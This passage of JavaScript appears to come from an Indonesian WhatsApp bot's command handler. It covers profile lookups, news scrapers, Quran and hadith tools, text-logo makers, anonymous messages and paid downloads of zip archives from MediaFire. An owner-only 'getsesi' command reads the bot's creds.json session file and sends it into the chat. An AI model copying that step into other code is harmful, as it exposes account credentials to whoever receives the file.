RezzHost.sendMessage(from, { video: { url: yeha.path }, caption : yeha.title }, { quoted: m })
}
break

// BATAS NSFW MENU


// GET MENU


case 'getbio':{
if (!isCreator) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await RezzHost.fetchStatus(who)
    reply(bio.status)
  } catch {
    if (text) return reply(`bio is private or you haven't replied to the person's message!`)
    else try {
      let whoto = m.quoted ? m.quoted.sender : m.sender
      let bio = await RezzHost.fetchStatus(who)
      reply(bio.status)
    } catch {
      return reply(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
case 'getname': {
if (!isCreator) return reply2(mess.owner)
await loading()
if (qtod === "true") {
namenye = await RezzHost.getName(m.quoted.sender)
reply2(namenye)
} else if (qtod === "false") {
RezzHost.sendMessage(from, {text:"Reply orangnya"}, {quoted:kalgans})
}
}
break
case 'getpic': {
if (!isCreator) return reply2(mess.owner)
await loading()
if (qtod === "true") {
try {
pporg = await RezzHost.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
RezzHost.sendMessage(from, { image : { url : pporg }, caption:`Done` }, {quoted:kalgans})
} else if (qtod === "false") {
try {
pporgs = await RezzHost.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
RezzHost.sendMessage(from, { image : { url : pporgs }, caption:`Done` }, {quoted:kalgans})
}
}
break
case 'getsesi':
            if (!isCreator) return reply(mess.owner)
            reply('Tunggu Sebentar, Sedang mengambil file sesi mu')
            let ses = await fs.readFileSync('./RezzSession/creds.json')
            RezzHost.sendMessage(m.chat, { document: ses, mimetype: 'application/json', fileName: 'creds.json' }, { quoted: kalgans })
        break
case 'getcv8': {
if (users.balance < 15000) return RezzHost.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: kalgans })
reply(mess.wait) 
users.balance -= 15000
const { mediafireDl } = require('./lib/scrape/mediafire.js')
const baby2 = await mediafireDl('https://www.mediafire.com/file/6fpst4kxqvusczl/SC_CAMPURNA_V8.zip/file')

RezzHost.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : kalgans }).catch ((err) => reply('*Failed to download File*'))

}

break
case 'getscpush': {
if (users.balance < 5000) return RezzHost.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp5.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: kalgans })
reply(mess.wait)
users.balance -= 5000
const { mediafireDl } = require('./lib/scrape/mediafire.js')
const baby2 = await mediafireDl('https://www.mediafire.com/file/f1wnv3o8rhmu6fzip/file')

RezzHost.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : kalgans }).catch ((err) => reply('*Failed to download File*'))

}

break
case 'gethw22': {
if (users.balance < 10000) return RezzHost.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: kalgans })
reply(mess.wait) 
users.balance -= 10000
const { mediafireDl } = require('./lib/scrape/mediafire.js')
const baby2 = await mediafireDl('https://www.mediafire.com/file/j0s3jsvhioskpvx/hw22%252Bcpanel.zip/file')

RezzHost.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : kalgans }).catch ((err) => reply('*Failed to download File*'))

}

break
case 'gethyuv7': {
if (users.balance < 30000) return RezzHost.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: kalgans })
reply(mess.wait) 
users.balance -= 30000
const { mediafireDl } = require('./lib/scrape/mediafire.js')
const baby2 = await mediafireDl('https://www.mediafire.com/file/v1odaa0wev1bxk3/New.zip/file')

RezzHost.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : kalgans }).catch ((err) => reply('*Failed to download File*'))

}

break
case 'getcv7': {
if (users.balance < 15000) return RezzHost.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: kalgans })
reply(mess.wait) 
                    users.balance -= 15000
const { mediafireDl } = require('./lib/scrape/mediafire.js')
const baby2 = await mediafireDl('https://www.mediafire.com/file/hcdk2rmxqsa9f8q/V7_ALL_FIXZ.zip/file')

RezzHost.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : kalgans }).catch ((err) => reply('*Failed to download File*'))

}

break
case 'getsccampuran': {
if (users.balance < 15000) return RezzHost.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: kalgans })
users.balance -= 15000
const { mediafireDl } = require('./lib/scrape/mediafire.js')
const baby2 = await mediafireDl('https://www.mediafire.com/file/9yhswnjhv6ien65/campurangabut.zip/file')

RezzHost.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : kalgans }).catch ((err) => reply('*Failed to download File*'))

}

break
case 'gethw20': {
if (users.balance < 10000) return RezzHost.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: kalgans })
users.balance -= 10000
const { mediafireDl } = require('./lib/scrape/mediafire.js')
const baby2 = await mediafireDl('https://www.mediafire.com/file/u8h5xo949proq7g/hw20.zip/file')

RezzHost.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : kalgans }).catch ((err) => reply('*Failed to download File*'))

}

break
case 'getpm2': {

const { mediafireDl } = require('./lib/scrape/mediafire.js')
const baby2 = await mediafireDl('https://www.mediafire.com/file/j9kd5yci6oi6jgg/cekil.json/file')

RezzHost.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : kalgans }).catch ((err) => reply('*Failed to download File*'))

}

break
case 'getegg': {

const { mediafireDl } = require('./lib/scrape/mediafire.js')
const baby2 = await mediafireDl('https://www.mediafire.com/file/m9kpl3kb969guvv/egg-RezzHost.json/file')

RezzHost.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : kalgans }).catch ((err) => reply('*Failed to download File*'))

}
break


// BATAS GET MENU


// BERITA MENU


case 'wikimedia': {
                if (!text) return reply('Enter Query Title')
                reply(mess.search)
		let { wikimedia } = require('./lib/scrape/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                RezzHost.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: kalgans })
            }
            break
case 'wikipedia':
			if (args.length == 0) return reply(`Example: ${prefix + command} Tahu`)
			reply(mess.search)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/wiki?apikey=${apikey}&query=${args[0]}`)
			reply(data.result)
			break
case 'jadwaltv':
if (args.length == 0) return reply(`Example: ${prefix + command} RCTI`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/${args[0]}?apikey=${apikey}`)
var txtayaj = `Jadwal TV ${args[0].toUpperCase()}\n`
for (var x in data.result) {
txtayaj += `${x} - ${data.result[x]}\n`
}
reply(txtayaj)
break
case 'jadwaltvnow':
var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${apikey}`)
var txtayajas = `Jadwal TV Now :\n`
for (var x in data.result) {
txtayajas += `${x.toUpperCase()}${data.result[x]}\n\n`
}
reply(txtayajas)
break
case 'fajar':
if (isBan) return reply2(mess.ban)
await loading()
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
case 'cnn':
if (isBan) return reply2(mess.ban)
await loading()
CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
case 'layarkaca':
if (isBan) return reply2(mess.ban)
await loading()
if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
reply(teks) 
})
break
case 'cnbc':
if (isBan) return reply2(mess.ban)
await loading()
CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
RezzHost.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:kalgans })
})
break
case 'tribun':
if (isBan) return reply2(mess.ban)
await loading()
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
RezzHost.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:kalgans })
})
break
case 'indozone':
if (isBan) return reply2(mess.ban)
await loading()
IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
RezzHost.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:kalgans })
})
break
case 'kompas':
if (isBan) return reply2(mess.ban)
await loading()
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
RezzHost.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:kalgans })
})
break
case 'detik':
if (isBan) return reply2(mess.ban)
await loading()
DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
RezzHost.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:kalgans })
})
break
case 'daily':
if (isBan) return reply2(mess.ban)
await loading()
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
RezzHost.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:kalgans })
})
break
case 'inews':
if (isBan) return reply2(mess.ban)
await loading()
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
case 'okezone':
if (isBan) return reply2(mess.ban)
await loading()
OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
RezzHost.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:kalgans })
})
break
case 'sindo':
if (isBan) return reply2(mess.ban)
await loading()
SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
case 'tempo':
if (isBan) return reply2(mess.ban)
await loading()
TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
RezzHost.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:kalgans })
})
break
case 'antara':
if (isBan) return reply2(mess.ban)
await loading()
AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
RezzHost.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:kalgans })
})
break
case 'kontan-news':
if (isBan) return reply2(mess.ban)
await loading()
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
RezzHost.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:kalgans })
})
break
case 'merdeka-news':
if (isBan) return reply2(mess.ban)
await loading()
MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
RezzHost.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:kalgans })
})
break
case 'jalantikus-meme':
await loading()
var reis = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${reis}`
teks += ""
RezzHost.sendMessage(m.chat, { image : { url : reis }, caption: teks }, { quoted:kalgans })
break


// BATAS BERITA MENU

// ISLAM MENU


case 'listsurah':
await loading()
axios
.get(`https://api.lolhuman.xyz/api/quran?apikey=${apikey}`)
.then(({ data }) => {
var text = 'List Surah:\n'
for (var x in data.result) {
text += `${x}. ${data.result[x]}\n`
}
reply(text)
})
.catch(console.error)
break
case 'alquran':
if (isBan) return reply2(mess.ban)
await loading()
if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
axios
.get(`https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var ayat = data.result.ayat
var text = `QS. ${data.result.surah} : 1-${ayat.length}\n\n`
for (var x of ayat) {
text += `${x.arab}\n${x.ayat}. ${x.latin}\n${x.indonesia}\n\n`
}
text = text.replace(/<u>/g, '_').replace(/<\/u>/g, '_')
text = text.replace(/<strong>/g, '*').replace(/<\/strong>/g, '*')
reply(text)
})
.catch(console.error)
break
case 'alquranaudio':
if (isBan) return reply2(mess.ban)
await loading()
if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
RezzHost.sendMessage(from, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${args[0]}?apikey=${apikey}` }, mimetype: 'audio/mp4' })
break
case 'asmaulhusna':
if (isBan) return reply2(mess.ban)
await loading()
axios
.get(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${apikey}`)
.then(({ data }) => {
var text = `No : ${data.result.index}\n`
text += `Latin: ${data.result.latin}\n`
text += `Arab : ${data.result.ar}\n`
text += `Indonesia : ${data.result.id}\n`
text += `English : ${data.result.en}`
reply(text)
})
.catch(console.error)
break
case 'hadist': {
                if (!args[0]) return reply(`Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`)
                if (!args[1]) return `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
                try {
                    let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
                    let {
                        number,
                        arab,
                        id
                    } = res.find(v => v.number == args[1])
                    reply(`No. ${number}

${arab}

${id}`)
                } catch (e) {
                    reply(`Hadis tidak ditemukan !`)
                }
            }
            break
            case 'tafsirsurah': {
                if (!args[0]) return `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
                if (!args[1]) return `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
                let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
                let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
                reply(txt)
            }
            break
case 'niatshalat':
if (args.length == 0) return reply(`Example: ${prefix + command} subuh`)
axios
.get(`https://api.lolhuman.xyz/api/niatsholat/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var text = `name : ${data.result.name}\n`
text += `arab : ${data.result.ar}\n`
text += `latin : ${data.result.latin}\n`
text += `indonesia : ${data.result.id}`
reply(text)
})
.catch(console.error)
break
case 'bacaanshalat':{
let bacaanshalat = require('./lib/scrape/bacaansholat.js')
let json = bacaanshalat
let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
    let contoh = `*「 Bacaan Shalat 」*\n\n`
    reply(contoh + data)
}
break
case 'kisahnabi':
if (isBan) return reply2(mess.ban)
await loading()
if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
axios
.get(`https://api.lolhuman.xyz/api/kisahnabi/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var text = `Name : ${data.result.name}\n`
text += `Lahir : ${data.result.thn_kelahiran}\n`
text += `Umur : ${data.result.age}\n`
text += `Tempat : ${data.result.place}\n`
text += `Story : \n${data.result.story}`
reply(text)
})
.catch(console.error)
break
case 'jadwalsholat':
if (isBan) return reply2(mess.ban)
await loading()
if (args.length == 0) return reply(`Example: ${prefix + command} Sukabumi`)
axios
.get(`https://api.lolhuman.xyz/api/sholat/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var text = `Wilayah : ${data.result.wilayah}\n`
text += `Tanggal : ${data.result.tanggal}\n`
text += `Sahur : ${data.result.sahur}\n`
text += `Imsak : ${data.result.imsak}\n`
text += `Subuh : ${data.result.subuh}\n`
text += `Terbit : ${data.result.terbit}\n`
text += `Dhuha : ${data.result.dhuha}\n`
text += `Dzuhur : ${data.result.dzuhur}\n`
text += `Ashar : ${data.result.ashar}\n`
text += `Maghrib : ${data.result.imsak}\n`
text += `Isya : ${data.result.isya}`
reply(text)
})
.catch(console.error)
break


// BATAS ISLAM MENU


// TEXTPRO


case 'avenger': case 'space': case 'ninjalogo': case 'marvelstudio': case 'lionlogo': case 'wolflogo': case 'steel3d': {
		    if (!text) return reply(`Example: ${prefix + command} Kayy|Offc`)
		    let txtt = text.split('|');
			if (txtt.length < 2) return reply(`Example: ${prefix + command} Kayy|Offc`)
			reply(mess.wait)
			RezzHost.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${apikey}&text1=${txtt[0]}&text2=${txtt[1]}`}, caption: `Type: ${command}\nText: ${args}\n\nCreated By ${botname}`}, { quoted: kalgans })
			}
			break
case 'pornhubmaker': 
if (args.length == 0) return reply(`Example: ${prefix + command} RezzHost`)
reply(mess.wait)
RezzHost.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome2/pornhub?apikey=${apikey}&text1=${args[0]}&text2=${args[1]}`}, caption: `Created By Rerez\n\n Type: ${command}\n\nText: ${args}`}, { quoted: kalgans })
break		
		case 'neon':
		case 'greenneon':
		case 'advanceglow':
		case 'futureneon':
		case 'sandwriting':
		case 'sandsummer':
		case 'sandengraved':
		case 'metaldark':
		case 'neonlight':
		case 'holographic':
		case 'text1917':
		case 'minion':
		case 'deluxesilver':
		case 'newyearcard':
		case 'bloodfrosted':
		case 'halloween':
		case 'jokerlogo':
		case 'fireworksparkle':
		case 'natureleaves':
		case 'bokeh':
		case 'toxic':
		case 'strawberry':
		case 'box3d':
		case 'roadwarning':
		case 'breakwall':
		case 'icecold':
		case 'luxury':
		case 'cloud':
		case 'summersand':
		case 'horrorblood':
		case 'thunder': {
			if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example: ${prefix + command} RezzHost`)
await loading()
			RezzHost.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${apikey}&text=${q}` }, caption: `Type: ${command}\nText: ${q}\n\n*Created By RezzHost*`}, { quoted: kalgans })
			}
			break
case 'anonymhacker': case 'aovwall': case 'avatardota': case 'avatarlolnew': case 'cartoongravity': case 'fpslogo': case 'lighttext': case 'logogaming': case 'lolbanner': case 'pubgmaskot': case 'starsnight': case 'wooden3d':{
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example :${prefix+command} Lins`)
reply(mess.wait)
await sleep(1000)
let putrii23 =`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${apikey}&text=${q}`
RezzHost.sendMessage(from, {image: { url: putrii23 }, caption: ``}, { quoted: kalgans})
}
break


// BATAS TEXPRO


// EPHOTO 


case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!isPrem) return reply(mess.premium)
if (!q) return reply(`Example : ${prefix+command} Rerez`) 
reply(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
RezzHost.sendMessage(m.chat, { image: { url: haldwhd }, caption: `success` }, { quoted: kalgans })
}
break


// BATAS EPHOTO


// RANDOM MENU


case 'storywa': {
if (!text) return reply(`Example : ${prefix + command} lucu\n\nOpsi Tersedia:\n• sad\n• cinta\n• lucu\n• sad boy\n• rindu\n• sahabat\n\nBy ${ownername}`)
reply(mess.search)
let old = new Date()
const json = await chApi.wasearch(text)  
result = json[Math.floor(Math.random() * json.length)]
let str = `乂  *S T O R Y*\n\n`
str += `	◦  *Title* : ${result.title}\n\n`
str += `🍟 *Fetching* : ${((new Date - old) * 1)} ms\n\n`
str += global.footer
RezzHost.sendMessage(m.chat, { video: { url: result.video_url }, caption: str }, { quoted: kalgans })
}
break
case 'afk': {
users.afkTime = +new Date
users.afkReason = text
reply(`
*${m.pushName}*
Telah Afk${text ? ': ' + text : ''}`)
}
break
case 'define': 
if (!q) return reply(`Apa yang ingin anda devinisikan ?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return reply('error')
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   RezzHost.sendMessage(m.chat,{text:reply},{quoted:kalgans})
} catch (err) {
    console.log(err)
    return reply(`*${q}* isn't a valid text`)
    }
    break
case 'menfes': case 'confess': {
if (Object.values(anon.anonymous).find(p => p.check(sender))) return reply("You are still in the room")
if (m.isGroup) return reply('private')
if (!isCreator) return reply(`Use ${prefix+command} number|your message\nExample ${prefix+command} ${ownernumber}|Hi Owner`)
if (text > 700) return reply(`The text is too long`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
pesan = q.split('|')[1]
let cekno = await RezzHost.onWhatsApp(num)
if (cekno.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
if (num === m.sender) return reply(`Cannot Confess To Own Number!!!`)
if (num === botNumber) return reply(`Can't Confess to bot number!!!`)
let nomor = m.sender

const xeonconfesmsg = `Hi, I'm a bot. Someone sent a message to you.

Someone your friend
(Secret Sender)

-------------------------------------->

💌 Message : ${pesan}

-------------------------------------->`

await RezzHost.sendMessage(num,
{ text: xeonconfesmsg,
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${owner}`,
